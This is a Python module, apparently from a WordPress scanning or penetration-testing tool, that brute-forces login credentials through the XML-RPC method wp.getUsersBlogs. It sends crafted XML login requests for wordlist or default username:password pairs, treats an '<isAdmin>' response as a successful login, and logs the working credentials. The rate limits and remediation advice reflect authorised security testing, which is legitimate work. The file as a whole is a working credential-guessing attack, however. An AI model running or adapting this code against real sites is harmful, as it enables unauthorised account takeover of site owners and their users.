# recon_wp/steps/xmlrpc/xmlrpc_creds_step.py
"""
XML-RPC credentials brute force - tests credentials via wp.getUsersBlogs.

Rate-limited credential testing with lockout detection.
Falls back to limited default credentials if no wordlist configured.
"""

# WHAT: Brute forces credentials via XML-RPC wp.getUsersBlogs
# HOW: Tests username:password pairs (wordlist or built-in fallback)
# WHY: XML-RPC is faster than web login and often less protected
# SECURITY: Rate limited (5/sec), exponential backoff, skips after 3 lockouts
# FALLBACK: Uses 20 common WordPress credentials if no wordlist configured

from base.dependencies import WordlistDependencyMixin
from base.http_step import BaseHttpStep
from core.finding import Finding
from utils.rate_limiter import RetryLimiter


class XmlrpcCredsStep(BaseHttpStep, WordlistDependencyMixin):
    """Brute force WordPress credentials via XML-RPC wp.getUsersBlogs.

    SECURITY:
    - Rate limited to 5 requests/second
    - Exponential backoff on failures
    - Skips after 3 consecutive failures
    - Falls back to limited default credentials if no wordlist configured

    DEPENDENCY:
    - Optional wordlist with format: username:password per line
    - Falls back to 20 common WordPress credentials if not configured
    """

    name = "xmlrpc_creds"
    description = "Brute force credentials via XML-RPC"
    severity = "high"
    MODULE = "xmlrpc"

    def __init__(self, target, config, http=None):
        super().__init__(target, config, http)
        self._limiter = RetryLimiter(
            max_requests=5,
            per_seconds=1.0,
            backoff_factor=2.0,
            max_retries=3,
            max_consecutive_failures=3,
        )

    async def run(self) -> list[Finding]:
        self.logger.info("Checking XML-RPC credential brute force availability...")

        credentials = self.resolve_credentials_with_fallback(config_key="wordlist")
        if not credentials:
            return self.findings

        using_fallback = credentials == self.DEFAULT_WORDLIST_CREDENTIALS
        mode = "fallback (limited)" if using_fallback else "wordlist"
        self.logger.info(
            f"Testing {len(credentials)} credential combinations "
            f"({mode}, rate limited to 5 req/sec, max 3 consecutive failures)"
        )

        url = self.urljoin("xmlrpc.php")
        successful_logins = []
        tested_count = 0

        for username, password in credentials:
            if self._limiter.should_skip():
                self.logger.warning(
                    f"Skipping after {self._limiter.consecutive_failures} consecutive failures"
                )
                break

            result = await self._limiter.execute_with_retry(
                self._test_credentials(url, username, password),
                on_success=lambda r: successful_logins.append(r) if r else None,
            )

            tested_count += 1
            if tested_count % 10 == 0:
                self.logger.debug(f"Tested {tested_count} credentials...")

        if successful_logins:
            self._add_finding(
                module=self.MODULE,
                severity=self.severity,
                title="Valid credentials found via XML-RPC",
                description=f"Found {len(successful_logins)} valid credential(s) via XML-RPC brute force. "
                f"Tested {tested_count} combinations.",
                evidence=", ".join(f"{u}:{p}" for u, p in successful_logins[:5]),
                recommendation="Disable XML-RPC if not needed, implement account lockout policies, "
                "use strong unique passwords",
                raw={
                    "valid_credentials": successful_logins,
                    "tested_count": tested_count,
                    "mode": mode,
                },
            )
            self.logger.warning(f"Found {len(successful_logins)} valid credentials!")
        elif (
            self._limiter.consecutive_failures >= self._limiter.max_consecutive_failures
        ):
            self.logger.warning(
                f"Stopped after {self._limiter.consecutive_failures} consecutive failures - "
                "possible account lockout protection detected"
            )
            self._add_finding(
                module=self.MODULE,
                severity="low",
                title="Possible lockout protection detected",
                description="Multiple consecutive failures during brute force - possible account lockout",
                evidence=f"{self._limiter.consecutive_failures} consecutive failures",
                recommendation="Consider slowing down or stopping to avoid lockouts",
                raw={"consecutive_failures": self._limiter.consecutive_failures},
            )

        return self.findings

    async def _test_credentials(
        self, url: str, username: str, password: str
    ) -> tuple[str, str] | None:
        """Test a single username/password combination."""
        xml_request = f"""<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value><string>{username}</string></value></param>
<param><value><string>{password}</string></value></param>
</params>
</methodCall>"""

        try:
            response = await self.http.post(
                url, content=xml_request, headers={"Content-Type": "text/xml"}
            )

            content = response.text

            if (
                response.status_code == 200
                and "<array>" in content
                and "<data>" in content
                and "<isAdmin>" in content
            ):
                return (username, password)

        except Exception as e:
            self.logger.debug(f"Error testing {username}: {e}")

        return None
